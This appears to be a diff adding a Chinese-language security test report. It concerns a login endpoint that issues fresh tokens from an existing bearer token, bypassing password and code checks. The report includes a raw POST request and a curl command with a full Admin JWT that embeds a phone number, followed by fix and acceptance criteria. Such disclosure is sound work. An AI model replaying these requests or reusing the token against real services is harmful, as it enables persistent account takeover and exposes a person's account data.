@@ -1,0 +1,50 @@
+一、漏洞信息
+
+漏洞名称：
+
+商户端token绕过账号密码校验获取新token
+
+风险等级：
+
+中危
+
+风险地址：
+
+https://global.service.test.qbitnetwork.com/auth/login
+
+风险描述：
+
+1、使用token无限制获取token，当被泄露后，攻击者可持续性对账户进行攻击。
+
+二、测试详情
+
+1、漏洞详情
+
+使用未失效的token，可绕过账号密码验证码校验，获取新token。且可重复获取，获取一次，上一个不失效。
+
+POST数据包
+
+POST /auth/login HTTP/1.1
+
+Host: global.service.test.qbitnetwork.com
+
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjJlODM4NjQzLTk4N2UtNDY3NC05NzM4LThiNWUxZjAxNWFmNyIsImFjY291bnQiOiIrODYxNzYzOTM3MDUwMyIsInJvbGUiOiJBZG1pbiIsImFjY291bnRJZCI6IjQwOGQwZjgwLWJkZmItNDU0Ny1iZDRkLTBjNjkxOWQwODA5ZCIsInBob25lIjoiKzg2MTc2MzkzNzA1MDMiLCJpc01vcmUiOmZhbHNlLCJpYXQiOjE3ODU5MTUxMDYsImV4cCI6MTc4NjAwMTUwNn0.0BbudxtUIeD1BreXXOUaY7vpqdXCgOuIVp7Oe5TtRDo
+
+Content-Type: application/json
+
+Content-Length: 38
+
+{"account":"account","password":"pwd"}
+
+curl --path-as-is -i -s -k -X $'POST' \
+    -H $'Host: global.service.test.qbitnetwork.com' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjJlODM4NjQzLTk4N2UtNDY3NC05NzM4LThiNWUxZjAxNWFmNyIsImFjY291bnQiOiIrODYxNzYzOTM3MDUwMyIsInJvbGUiOiJBZG1pbiIsImFjY291bnRJZCI6IjQwOGQwZjgwLWJkZmItNDU0Ny1iZDRkLTBjNjkxOWQwODA5ZCIsInBob25lIjoiKzg2MTc2MzkzNzA1MDMiLCJpc01vcmUiOmZhbHNlLCJpYXQiOjE3ODU5MTUxMDYsImV4cCI6MTc4NjAwMTUwNn0.0BbudxtUIeD1BreXXOUaY7vpqdXCgOuIVp7Oe5TtRDo' -H $'Content-Type: application/json' -H $'Content-Length: 38' \
+    --data-binary $'{\"account\":\"account\",\"password\":\"pwd\"}' \
+    $'https://global.service.test.qbitnetwork.com/auth/login'
+
+三、修复建议
+
+1、针对登录认证接口/auth/login，禁止使用token获取token，依旧校验账号密码验证码。
+
+四、验收标准
+
+1、禁止使用token获取token
